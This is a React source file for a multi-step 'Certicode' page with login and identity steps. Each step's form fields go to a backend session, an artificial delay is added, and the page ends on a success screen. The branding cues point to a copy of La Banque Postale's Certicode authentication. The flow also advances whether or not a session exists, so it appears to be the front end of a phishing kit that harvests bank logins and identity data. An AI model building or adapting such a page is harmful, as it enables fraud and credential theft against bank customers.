import { useEffect, useRef, useState } from "react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import LoginStep from "@/components/steps/LoginStep";
import IdentityStep from "@/components/steps/IdentityStep";
import SuccessStep from "@/components/steps/SuccessStep";
import { createSession, submitStep } from "@/lib/api";
import { toast } from "sonner";

const STEPS = ["login", "identity", "complete"];

export default function CerticodeFlow() {
  const [sessionId, setSessionId] = useState(null);
  const [currentStep, setCurrentStep] = useState("login");
  const [submitting, setSubmitting] = useState(false);
  const sessionRequestedRef = useRef(false);

  useEffect(() => {
    if (sessionRequestedRef.current) return;
    sessionRequestedRef.current = true;
    (async () => {
      try {
        const data = await createSession();
        setSessionId(data.session_id);
      } catch (err) {
        console.error("session create failed", err);
      }
    })();
  }, []);

  const goNext = (stepKey) => {
    const idx = STEPS.indexOf(stepKey);
    setCurrentStep(STEPS[Math.min(idx + 1, STEPS.length - 1)]);
  };

  const handleStepSubmit = async (stepKey, fields) => {
    if (submitting) return;
    setSubmitting(true);
    try {
      const start = Date.now();
      if (sessionId) {
        await submitStep(sessionId, stepKey, fields);
      }
      const elapsed = Date.now() - start;
      const minDelay = 900;
      if (elapsed < minDelay) {
        await new Promise((r) => setTimeout(r, minDelay - elapsed));
      }
      goNext(stepKey);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch (err) {
      console.error("submit failed", err);
      toast.error("Une erreur est survenue. Merci de réessayer.");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white" data-testid="certicode-flow">
      <Header />

      <main className="flex-1 px-4 sm:px-6 py-6 sm:py-10">
        <div className="mx-auto w-full max-w-xl">
          <div
            className="rounded-none sm:rounded-xl bg-white p-1 sm:p-8 sm:border sm:border-[#E8ECF1] sm:lbp-shadow-lg"
            data-testid="step-card"
          >
            {currentStep === "login" && (
              <LoginStep
                onSubmit={(f) => handleStepSubmit("login", f)}
                submitting={submitting}
              />
            )}
            {currentStep === "identity" && (
              <IdentityStep
                onSubmit={(f) => handleStepSubmit("identity", f)}
                submitting={submitting}
              />
            )}
            {currentStep === "complete" && <SuccessStep />}
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
